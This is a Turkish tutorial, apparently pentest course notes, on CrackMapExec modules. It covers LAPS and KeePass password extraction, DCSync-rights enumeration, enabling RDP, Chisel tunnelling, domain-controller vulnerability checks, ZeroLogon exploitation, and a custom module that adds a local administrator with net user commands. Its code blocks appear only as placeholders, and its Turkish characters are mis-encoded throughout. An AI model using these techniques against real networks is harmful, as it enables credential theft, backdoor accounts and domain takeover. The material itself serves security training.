### Popular Modules

CrackMapExec ile ilgili en heyecan verici ÅŸeylerden biri, modÃ¼ler olmasÄ± ve herkesin modÃ¼ller oluÅŸturmasÄ±na ve bunlarÄ± araca katkÄ±da bulunmasÄ±na izin vermesidir. CrackMapExec, exploit ve exploit sonrasÄ± gÃ¶revleri kolaylaÅŸtÄ±rmak iÃ§in iÅŸlemler gerÃ§ekleÅŸtirmemizi saÄŸlayan 50'den fazla modÃ¼le sahiptir. Bu bÃ¶lÃ¼mde LDAP ve SMB protokolleri iÃ§in bu modÃ¼llerden bazÄ±larÄ± incelenecektir.


### LDAP Protocol Modules

LDAP protokolÃ¼ yaygÄ±n olarak Domain Controller'lar ile etkileÅŸime geÃ§memizi ve onlardan bilgi almamÄ±zÄ± saÄŸlar. Active Directory'den ilginÃ§ bilgiler Ã§Ä±karmamÄ±zÄ± saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.


### **LDAP Module - get-network**

`get-network` modÃ¼lÃ¼ [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'Ä±  temel alÄ±r. VarsayÄ±lan olarak, Active Directory'deki herhangi bir kullanÄ±cÄ±, `zone transferine` benzer ÅŸekilde Domain veya Forest DNS bÃ¶lgelerindeki tÃ¼m DNS kayÄ±tlarÄ±nÄ± numaralandÄ±rabilir. Bu araÃ§, internal aÄŸlarÄ±n yeniden yapÄ±landÄ±rÄ±lmasÄ± amacÄ±yla bÃ¶lgedeki tÃ¼m DNS kayÄ±tlarÄ±nÄ±n numaralandÄ±rÄ±lmasÄ±nÄ± ve dÄ±ÅŸa aktarÄ±lmasÄ±nÄ± saÄŸlar.

ModÃ¼lÃ¼ kullanmanÄ±n Ã¼Ã§ (3) yolu vardÄ±r:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adlarÄ±).

VarsayÄ±lan olarak, herhangi bir seÃ§enek belirtmezsek, modÃ¼l yalnÄ±zca IP adresini alacaktÄ±r. `ALL=true` seÃ§eneÄŸini seÃ§ersek, hem IP hem de domain adlarÄ±nÄ± alÄ±r ve `ONLY_HOSTS=true` olarak belirtirsek, yalnÄ±zca FQDN'yi alÄ±rÄ±z.


### DNS Sunucusundan (Record) KayÄ±tlarÄ± Alma

{{CODE_BLOCK_196}}

{{CODE_BLOCK_197}}

{{CODE_BLOCK_198}}


Not: Bu yazÄ±nÄ±n yazÄ±ldÄ±ÄŸÄ± zamanda, modÃ¼l **`adidnsdump`** aracÄ±yla bazÄ± farklÄ±lÄ±klar gÃ¶stermektedir. SonuÃ§lar, hesaplar arasÄ±nda farklÄ±lÄ±k gÃ¶sterebilir.


### LDAP Module - laps

Bir baÅŸka harika modÃ¼l de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e baÄŸlÄ± bilgisayarlarda local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL'ler tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca belirli kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya `parola sÄ±fÄ±rlama` talebinde bulunabilir. Laps modÃ¼lÃ¼ ile bir hesabÄ±n okuma eriÅŸimine sahip olduÄŸu tÃ¼m bilgisayarlarÄ± alabiliriz. Bir bilgisayarÄ± belirtmek iÃ§in `COMPUTER` seÃ§eneÄŸini de kullanabilir veya benzer ada sahip birkaÃ§ bilgisayarÄ± almak iÃ§in bir wildcard karakterle birlikte kullanabiliriz.


### LAPS ModÃ¼lÃ¼ ParolalarÄ±n AlÄ±nmasÄ±

{{CODE_BLOCK_199}}

{{CODE_BLOCK_200}}


Not: KullanÄ±lan parola bir Ã¶rnektir. Hedef hostta Ã§alÄ±ÅŸmayacaktÄ±r

### LDAP ModÃ¼lÃ¼ - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'Ã¼ ile temsil edilen ve varsayÄ±lan olarak bir **user**'Ä±n bir **domain** iÃ§inde oluÅŸturabileceÄŸi **computer account** sayÄ±sÄ±nÄ± belirten bir **domain level attribute**'tÃ¼r.

**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazÄ± **attack** senaryolarÄ±nda **domain** iÃ§inde bir **machine** oluÅŸturmak gerekebilir, bu yÃ¼zden **account machine quota attribute**'Ã¼nÃ¼ **enumerate** etmek Ã¶nemlidir.


### Machine Quota Module

{{CODE_BLOCK_201}}


### LDAP Module - daclread

Bir baÅŸka harika modÃ¼l ise bir veya birden fazla object'in `DACL`'lerini okumamÄ±zÄ± ve dÄ±ÅŸa aktarmamÄ±zÄ± saÄŸlayan `daclread`'dir. Bu modÃ¼l Active Directory eriÅŸimini numaralandÄ±rmamÄ±zÄ± saÄŸlayacaktÄ±r. AÅŸaÄŸÄ±daki seÃ§eneklere sahiptir:

### daclread Module Options

{{CODE_BLOCK_202}}

Diyelim ki **`grace`** hesabÄ±nÄ±n tÃ¼m **ACE**'lerini okumak istiyoruz. Bunun iÃ§in **`TARGET`** seÃ§eneÄŸini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace KullanÄ±cÄ±sÄ±nÄ±n DACL'sini Oku

{{CODE_BLOCK_203}}


AyrÄ±ca belirli haklarÄ± da arayabiliriz, Ã¶rneÄŸin hangi **principal**'larÄ±n **DCSync** haklarÄ±na sahip olduÄŸunu. Bunun iÃ§in **`TARGET_DN`** seÃ§eneÄŸini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seÃ§eneÄŸini seÃ§memiz ve aramak istediÄŸimiz haklarÄ± **`RIGHTS`** seÃ§eneÄŸiyle belirlememiz gerekir.

### DCSync Rights'a Sahip KullanÄ±cÄ±larÄ± Arama

{{CODE_BLOCK_204}}



Ã‡Ä±ktÄ±da gÃ¶sterildiÄŸi gibi, `ACE[4]` `robert` kullanÄ±cÄ±sÄ±nÄ±n hedef domain'de `DCSync` haklarÄ±na sahip olduÄŸunu gÃ¶sterir.

LDAP'ta birkaÃ§ modÃ¼l daha kullanabiliriz. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.

### LDAP Protocol Modules

{{CODE_BLOCK_205}}


### SMB Protocol Modules

SMB protokolÃ¼nde daha fazla modÃ¼l mevcuttur. CrackMapExec modÃ¼lÃ¼nde yaptÄ±ÄŸÄ±mÄ±z ÅŸeylerin Ã§oÄŸu SMB protokolÃ¼nÃ¼ kullanÄ±r. Ä°lginÃ§ bilgiler elde etmemizi saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.

Not: SMB kullanan modÃ¼llerin Ã§oÄŸunun Ã§alÄ±ÅŸmasÄ± iÃ§in admin haklarÄ±na ( `Pwned!` ) ihtiyaÃ§ vardÄ±r.


### SMB ModÃ¼lleri - get_netconnections ve ioxidresolver

Bir aÄŸ pentesti Ã¼zerinde Ã§alÄ±ÅŸÄ±rken, sÃ¼rekli olarak daha fazla kaynaÄŸa veya aÄŸa eriÅŸim elde etmeye Ã§alÄ±ÅŸÄ±rÄ±z. CrackMapExec, daha Ã¶nce tehlikeye attÄ±ÄŸÄ±mÄ±z bir makineyi numaralandÄ±rmamÄ±za ve birden fazla aÄŸ yapÄ±landÄ±rmasÄ±na sahip olup olmadÄ±ÄŸÄ±nÄ± belirlememize olanak tanÄ±yan bazÄ± modÃ¼llere sahiptir. `get_netconnections` ve `ioxidresolver` modÃ¼llerini kullanalÄ±m ve farklarÄ±nÄ± gÃ¶relim.

`get_netconnections` modÃ¼lÃ¼, aÄŸ baÄŸlantÄ±larÄ±nÄ± sorgulamak iÃ§in `WMI` kullanÄ±r. `IPv6` ve herhangi bir ikincil IP dahil olmak Ã¼zere tÃ¼m IP adreslerinin yanÄ± sÄ±ra domain adÄ±nÄ± da alÄ±r.


### get_netconnections Module

{{CODE_BLOCK_206}}


Ã–te yandan, `ioxidresolver` modÃ¼lÃ¼ IP adreslerini sorgulamak iÃ§in RPC kullanÄ±r. Ancak, bu modÃ¼l `IPv6` adreslerini iÃ§ermez.

### ioxidresolver Module

{{CODE_BLOCK_207}}


Not: Ä°htiyaÃ§larÄ±mÄ±za en uygun olanÄ± seÃ§ebilmemiz iÃ§in bir modÃ¼lÃ¼n nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± anlamak Ã¶nemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal aÄŸlarda adminler ve kullanÄ±cÄ±lar tarafÄ±ndan parolalarÄ± ve gizli bilgileri tek bir veritabanÄ±nda saklamak iÃ§in yaygÄ±n olarak kullanÄ±lan Ã¼cretsiz, aÃ§Ä±k kaynaklÄ± bir password manager'dÄ±r. Bir master password onu korur. Bir KeePass veritabanÄ± alÄ±rsak, onu aÃ§mak iÃ§in ÅŸifresine ihtiyacÄ±mÄ±z vardÄ±r.

### KeePass'i KeÅŸfetme

{{CODE_BLOCK_208}}

EÄŸer master parolaya sahip deÄŸilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafÄ±ndan geliÅŸtirilen ve veritabanÄ±nÄ± aÃ§Ä±k metin olarak dÄ±ÅŸa aktarmak iÃ§in KeePass'Ä±n triger sistemini kullanan bir teknik kullanmaktÄ±r. KeePass yapÄ±landÄ±rma dosyasÄ±nÄ±, veritabanÄ±nÄ± otomatik olarak aÃ§Ä±k metin olarak dÄ±ÅŸa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) iÃ§erecek ÅŸekilde deÄŸiÅŸtirir.

Bunu kullanmak iÃ§in beÅŸ (5) adÄ±ma ihtiyacÄ±mÄ±z var:

*  KeePass yapÄ±landÄ±rma dosyasÄ±nÄ± bulun. Biz bunu `keepass_discover` modÃ¼lÃ¼ ile yaptÄ±k.
 * `ACTION=ADD` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH` Ã¶ÄŸesini kullanarak trigger'Ä± yapÄ±landÄ±rma dosyasÄ±na ekleyin.

### KeePass YapÄ±landÄ±rma DosyasÄ±na Trigger Ekleme

{{CODE_BLOCK_209}}

Not: KeePass yapÄ±landÄ±rma yolu iÃ§in ters eÄŸik Ã§izgi (`/`) veya Ã§ift eÄŸik Ã§izgi (`\`) kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

* KullanÄ±cÄ±nÄ±n KeePass'i aÃ§masÄ±nÄ± ve master parolayÄ± girmesini bekleyin. Bu iÅŸlemi zorlamak iÃ§in `ACTION=RESTART` seÃ§eneÄŸini kullanarak KeePass.exe prosesini yeniden baÅŸlatabiliriz. Hedef makinede oturum aÃ§mÄ±ÅŸ Ã§ok sayÄ±da kullanÄ±cÄ± varsa, `USER=julio` gibi kullanÄ±cÄ± adÄ± ile `USER` seÃ§eneÄŸini ekleyebiliriz.

{{CODE_BLOCK_210}}


`ACTION=POLL` seÃ§eneÄŸini kullanarak export edilen veritabanÄ±nÄ± makinemize sorgulayÄ±n. Daha sonra ÅŸifre giriÅŸlerini aramak iÃ§in grep kullanabiliriz.


### Ele GeÃ§irilen Hedeften Export Verileri Sorgulama

{{CODE_BLOCK_211}}

{{CODE_BLOCK_212}}


`ACTION=CLEAN` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapÄ±landÄ±rma dosyasÄ±nÄ± temizleyin

### Clean Configuration File Changes

{{CODE_BLOCK_213}}


Bu modÃ¼lÃ¼n her seÃ§eneÄŸini Ã¶ÄŸrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seÃ§eneÄŸin iyi yanÄ±, **extract_password** yÃ¶ntemini de iÃ§ermesidir; bu yÃ¶ntem **.xml** dosyasÄ±nda herhangi bir parola giriÅŸini arar ve konsola yazdÄ±rÄ±r.


### keeppass_trigger TÃœMÃœNÃœ Tek Komutta Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_214}}

Not: ModÃ¼l ÅŸifreyi yazdÄ±rÄ±rken sorun yaÅŸayabilir. Bir hata alabiliriz, ancak ÅŸifre `/tmp/export.xml` dosyasÄ±nda olacaktÄ±r, bÃ¶ylece manuel olarak alabiliriz.

### RDP'yi EtkinleÅŸtirme veya Devre DÄ±ÅŸÄ± BÄ±rakma

DeÄŸerlendirme yaparken yapmak isteyebileceÄŸimiz yaygÄ±n bir gÃ¶rev, RDP aracÄ±lÄ±ÄŸÄ±yla bir hedef makineye baÄŸlanmaktÄ±r. Bu, baÅŸka tÃ¼rlÃ¼ lateral hareket saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtiremediÄŸimiz veya standart bir protokol kullanarak radarÄ±n altÄ±ndan geÃ§mek istediÄŸimiz bazÄ± senaryolarda yararlÄ± olabilir.

BaÄŸlanmak istediÄŸimiz makinede RDP etkin deÄŸilse, buna izin vermek iÃ§in RDP modÃ¼lÃ¼nÃ¼ kullanabiliriz. `ACTION` seÃ§eneÄŸini ve ardÄ±ndan `enable` veya `disable` seÃ§eneklerini belirtmemiz gerekir.


### RDP'yi EtkinleÅŸtirme

{{CODE_BLOCK_215}}


SMB'de birkaÃ§ modÃ¼l daha vardÄ±r. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.


### SMB Protocol Modules

{{CODE_BLOCK_216}}

Bir sonraki bÃ¶lÃ¼mde, ZeroLogon gibi bilinen gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanan diÄŸer SMB modÃ¼llerine bakacaÄŸÄ±z

### Vulnerability Scan Modules

SÄ±zma testi yaparken gerÃ§ekleÅŸtirdiÄŸimiz gÃ¼nlÃ¼k faaliyetlerden biri gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmeye Ã§alÄ±ÅŸmaktÄ±r. EÄŸer herhangi birini bulabilirsek, exploitation iÅŸi basit olabilir.

CrackMapExec, gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmemizi saÄŸlayan bazÄ± modÃ¼ller iÃ§erir. Bu oturumda bunlardan bazÄ±larÄ±nÄ± inceleyeceÄŸiz.


### Environment'i Ayarlama

Bu senaryoda, bir sunucuyu ele geÃ§irdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki aÄŸ kartÄ± var ve amacÄ±mÄ±z domainin saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek. Domainin IP adresi `172.16.10.3`'tÃ¼r.

Domain'e eriÅŸim saÄŸlamak iÃ§in, CME ile ProxyChain bÃ¶lÃ¼mÃ¼nde Ã¶ÄŸrendiklerimizi kullanacaÄŸÄ±z ve Chisel ile bir baÄŸlantÄ± kuracaÄŸÄ±z


### Chisel'i Hedef Makineye GÃ¶nderme

{{CODE_BLOCK_217}}


### SaldÄ±rÄ± Hostumuzda Chisel'Ä± Sunucu Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_218}}


### Chisel'Ä± Tehlikeye DÃ¼ÅŸmÃ¼ÅŸ Cihazdan SaldÄ±rÄ± Hostumuza BaÄŸlama

{{CODE_BLOCK_219}}


### Vulnerability Scan Modules

CrackMapExec'teki gÃ¼venlik aÃ§Ä±ÄŸÄ± modÃ¼llerinin Ã§oÄŸu yalnÄ±zca kontrol edilir ve bu modÃ¼lleri gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanmak iÃ§in kullanamayÄ±z. [ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile baÅŸlayalÄ±m.


### ZeroLogon

KimliÄŸi doÄŸrulanmamÄ±ÅŸ bir saldÄ±rgan, bir domain controller'a aÄŸ eriÅŸimi ile[ ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±ndan (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kÃ¶tÃ¼ye kullanmak ve sonunda domain'in controller'Ä± ele geÃ§irmek iÃ§in savunmasÄ±z bir Netlogon session'Ä± baÅŸlatmasÄ± gerekir. Bir Domain Controller'a baÄŸlanmak baÅŸarÄ±lÄ± bir saldÄ±rÄ± iÃ§in tek Ã¶n koÅŸul olduÄŸundan, gÃ¼venlik aÃ§Ä±ÄŸÄ± ciddidir.

CrackMapExec, bir Domain Controller'Ä±n ZeroLogon'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan zerologon adlÄ± bir modÃ¼l iÃ§erir.


### ZeroLogon GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_220}}


### PetitPotam

GÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± [Gilles Lionel](https://twitter.com/topotam77) kÄ±sa bir sÃ¼re Ã¶nce [PetitPotam](https://github.com/topotam/PetitPotam) adÄ± verilen ve saldÄ±rganlarÄ±n sadece kurumsal aÄŸ altyapÄ±sÄ±na eriÅŸim saÄŸlayarak domain'i tehlikeye atmasÄ±na olanak tanÄ±yan bir saldÄ±rÄ± tekniÄŸini ortaya Ã§Ä±kardÄ±. YÃ¶ntem, sunulan herhangi bir sunucu servisine (Ã¶rneÄŸin bir Domain Controller) yÃ¶nelik klasik bir `NTLM relay` saldÄ±rÄ±sÄ±dÄ±r. Lionel ayrÄ±ca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldÄ±rganlarÄ±n domain'i ele geÃ§irmek iÃ§in bu Ã¶zel saldÄ±rÄ± tekniÄŸini nasÄ±l kullanabileceklerini gÃ¶steren bir proof of  concept kodu da yayÄ±nladÄ±.

CrackMapExec, bir Domain Controller'Ä±n PetitPotam'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan `petitpotam` adlÄ± bir modÃ¼l iÃ§erir.


### Petitpotam GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_221}}


### noPAC

noPAC gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ±n exploit'i, normal bir domain kullanÄ±cÄ±sÄ±nÄ±n ayrÄ±calÄ±klarÄ±nÄ±n bir domain admin yÃ¼kseltilmesine izin verdi. Kavram kanÄ±tÄ± (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayÄ±nlandÄ±.

CrackMapExec, bir domain controller'Ä±n noPAC'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan nopac adlÄ± bir modÃ¼l iÃ§erir.


### noPAC vulnerability check

{{CODE_BLOCK_222}}



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlÄ± bir NTLM relay saldÄ±rÄ±sÄ± iÃ§in bir kavram kanÄ±tÄ± ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayÄ±nladÄ±. YÃ¶ntem, bir Windows domain'inin controller'Ä± ele geÃ§irmek iÃ§in Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolÃ¼nÃ¼ ele geÃ§iriyor.

Bu saldÄ±rÄ± bir domain kullanÄ±cÄ±sÄ± gerektirir ve bir DC'nin savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek iÃ§in CrackMapExec modÃ¼lÃ¼ `dfscoerce`'yi kullanabiliriz. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kontrol etmek iÃ§in `Y3t4n0th3rP4ssw0rd` ÅŸifresiyle `carole.holmes` hesabÄ±nÄ± kullanacaÄŸÄ±z.


### DFSCoerce Vulnerability Check

{{CODE_BLOCK_223}}


### ShadowCoerce

ShadowCoerce, gÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± Lionel Gilles tarafÄ±ndan 2021'in sonlarÄ±nda PetitPotam saldÄ±rÄ±sÄ±nÄ± sergileyen bir sunumun sonunda keÅŸfedildi ve ilk kez detaylandÄ±rÄ±ldÄ±. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanÄ±tÄ± ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluÅŸturdu.

CrackMapExec modÃ¼lÃ¼ shadowcoerce kullanarak DC'nin bu saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in carole.holmes hesabÄ±nÄ± kullanalÄ±m.


### ShadowCoerce Vulnerability Check

{{CODE_BLOCK_224}}


GÃ¼venlik aÃ§Ä±ÄŸÄ± tarama modÃ¼llerinin Ã§oÄŸu yazarÄ±, bilgisayarÄ±n gÃ¼venlik aÃ§Ä±ÄŸÄ± olup olmadÄ±ÄŸÄ±na dair bir mesaj eklememiÅŸtir, bu nedenle komut Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ktan sonra hiÃ§bir ÅŸey gÃ¶rmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modÃ¼lÃ¼nÃ¼n kaynak kodunu kontrol edersek, yazarÄ±n ( `logging.debug` ) ile bazÄ± debug log'larÄ± eklediÄŸini gÃ¶receÄŸiz. CrackMapExec'i hata debug modunda Ã§alÄ±ÅŸtÄ±rÄ±rsak, bu loglarÄ± yazdÄ±racaktÄ±r.

CrackMapExec'i debug modunda Ã§alÄ±ÅŸtÄ±rmak iÃ§in protokolden Ã¶nce `--verbose` seÃ§eneÄŸini kullanabiliriz


### shadowcoerce ModÃ¼lÃ¼nÃ¼ Verbose Enabled ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_225}}


`DEBUG` ile baÅŸlayan satÄ±rlar `logging.debug`'a karÅŸÄ±lÄ±k gelir. Son satÄ±rlarda hedefin savunmasÄ±z olmadÄ±ÄŸÄ±nÄ± gÃ¶sterdiÄŸini gÃ¶rebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diÄŸer adÄ±yla EternalBlue, Windows iÅŸletim sistemleri iÃ§in Microsft tarafÄ±ndan 14 Mart 2017 tarihinde yayÄ±nlanan bir gÃ¼venlik yamasÄ±dÄ±r. Yama, SMB servisindeki kritik bir kimliÄŸi doÄŸrulanmamÄ±ÅŸ remote kod Ã§alÄ±ÅŸtÄ±rma aÃ§Ä±ÄŸÄ± iÃ§indir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft GÃ¼venlik BÃ¼lteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'Ä±n MS17-010'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirleyen ms17-010 adlÄ± bir modÃ¼l iÃ§erir.


### MS17-010 Vulnerability Check

{{CODE_BLOCK_226}}


### GÃ¼venlik AÃ§Ä±ÄŸÄ±ndan Yararlanma

BirÃ§ok gÃ¼venlik aÃ§Ä±ÄŸÄ± gÃ¶rdÃ¼k. Onlardan birini exploit etmeye Ã§alÄ±ÅŸalÄ±m: ZeroLogon. ModÃ¼l tarafÄ±ndan saÄŸlanan baÄŸlantÄ±ya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalÄ±m:


### Exploiting ZeroLogon

{{CODE_BLOCK_227}}

{{CODE_BLOCK_228}}


Zaman geÃ§tikÃ§e yeni gÃ¼venlik aÃ§Ä±klarÄ± ortaya Ã§Ä±kacaktÄ±r ve bunlar sektÃ¶r uzmanlarÄ± veya bizim tarafÄ±mÄ±zdan CrackMapExec'e modÃ¼l olarak eklenebilir. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec iÃ§in nasÄ±l bir modÃ¼l oluÅŸturabileceÄŸimizi gÃ¶receÄŸiz.

---

### Kendi CME ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturmak

Yazarlar ve topluluk tarafÄ±ndan oluÅŸturulan birÃ§ok yerleÅŸik CrackMapExec modÃ¼lÃ¼nÃ¼ kullandÄ±k. Bu bÃ¶lÃ¼mde CrackMapExec iÃ§in modÃ¼lÃ¼mÃ¼zÃ¼ nasÄ±l yapabileceÄŸimizi keÅŸfedeceÄŸiz.


### CrackMapExec'i Poetry ile derleyin

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturmadan Ã¶nce, CrackMapExec projesinin nasÄ±l derleneceÄŸini bilmek Ã§ok Ã¶nemlidir. Bu amaÃ§la CME, projelerimizi oluÅŸtururken Ã¶nerilen [Poetry](https://python-poetry.org/)'yi kullanÄ±r. Poetry kullanmÄ±yorsanÄ±z, CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak Ã¼zere Poetry kullanmaya baÅŸlamak iÃ§in Kurulum ve Binaryler bÃ¶lÃ¼mÃ¼ne bir gÃ¶z atÄ±n

Åimdi kodu en sevdiÄŸimiz IDE ile aÃ§abiliriz. Bu bÃ¶lÃ¼mde [VSCode](https://code.visualstudio.com/) kullanacaÄŸÄ±z. VSCode'u [kurmak](https://code.visualstudio.com/download) iÃ§in .deb dosyasÄ±nÄ± kendi web sitesinden indirmemiz gerekiyor. DoÄŸrudan indirme baÄŸlantÄ±sÄ± [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un KurulmasÄ± ve Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ±

{{CODE_BLOCK_229}}

Daha sonra aÃ§mak iÃ§in `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturun

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturalÄ±m. Yeni bir administrator hesabÄ± oluÅŸturacak basit bir script oluÅŸturacaÄŸÄ±z.

* ./CrackMapExec/cme/modules klasÃ¶rÃ¼ altÄ±nda `createadmin.py` adÄ±nda bir dosya oluÅŸturun.
* AÅŸaÄŸÄ±daki kod Ã¶rneÄŸini dosyaya kopyalayÄ±n:

{{CODE_BLOCK_231}}



* Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ Ã¶zelleÅŸtirelim.

BazÄ± deÄŸiÅŸkenleri tanÄ±mlamamÄ±z gerekiyor:

* `name`, modÃ¼l adÄ±nÄ± nasÄ±l Ã§aÄŸÄ±racaÄŸÄ±mÄ±zÄ± belirtir. Bu durumda, `createadmin` dosya adÄ±nÄ± kullanacaÄŸÄ±z.
* `description` modÃ¼lÃ¼n amacÄ± iÃ§in kÄ±sa bir aÃ§Ä±klamadÄ±r. Biz bunu `Create a new administrator account` ayarlayacaÄŸÄ±z.
* `supported_protocols`, modÃ¼lÃ¼ kullanmak iÃ§in desteklenen protokolÃ¼n bir dizisidir. Biz sadece `SMB` kullanacaÄŸÄ±z.
* `opsec_safe`, modÃ¼lÃ¼n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ±n gÃ¼venli olduÄŸu anlamÄ±na gelen bir `True` veya `False` deÄŸeridir.
* `multiple_hosts`, bu modÃ¼lÃ¼ birden fazla hedefe karÅŸÄ± Ã§alÄ±ÅŸtÄ±rabileceÄŸimiz anlamÄ±na gelir.

AyrÄ±ca, modÃ¼l iÃ§in deÄŸiÅŸkenleri tanÄ±mlamak iÃ§in kullanÄ±lan `options()` methoduna da sahip olacaÄŸÄ±z. Bu durumda, `USER` ve `PASS` olmak Ã¼zere iki seÃ§enek ekleyeceÄŸiz. Her seÃ§eneÄŸin varsayÄ±lan deÄŸeri olabilir ya da olmayabilir. Bu yazara baÄŸlÄ±dÄ±r. USER iÃ§in varsayÄ±lan deÄŸeri dÃ¼z metin olarak ve PASS iÃ§in varsayÄ±lan deÄŸeri `asdasd123` . AyrÄ±ca USER o PASS modÃ¼l seÃ§eneÄŸinin boÅŸ olup olmadÄ±ÄŸÄ±nÄ± doÄŸrulamak iÃ§in bir kontrol ekledik. EÄŸer durum buysa, modÃ¼lden Ã§Ä±kÄ±lacaktÄ±r.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile Ã§alÄ±ÅŸacaÄŸÄ±z. Bu metot deÄŸiÅŸkenlerimizi almaktan ve hedeflere istediÄŸimiz herhangi bir gÃ¶revi yÃ¼rÃ¼tmekten sorumludur. Ã‡Ä±ktÄ± olarak `context.log.info` ve `context.log.highlight` metotlarÄ±nÄ± kullanacaÄŸÄ±z (farklÄ± renklere sahipler).

Bu execute iÃ§in, yÃ¶ntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z. Komutumuz, yeni bir kullanÄ±cÄ± eklemek iÃ§in `net user username password /add /Y` deÄŸeriyle ve kullanÄ±cÄ±yÄ± administrators grubuna eklemek iÃ§in `net localgroup administrators username /add` deÄŸeriyle command deÄŸiÅŸkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modÃ¼lÃ¼mÃ¼z ÅŸu ÅŸekilde gÃ¶rÃ¼nmelidir:

{{CODE_BLOCK_234}}


### ModÃ¼lÃ¼mÃ¼zÃ¼ Ã‡alÄ±ÅŸtÄ±rma

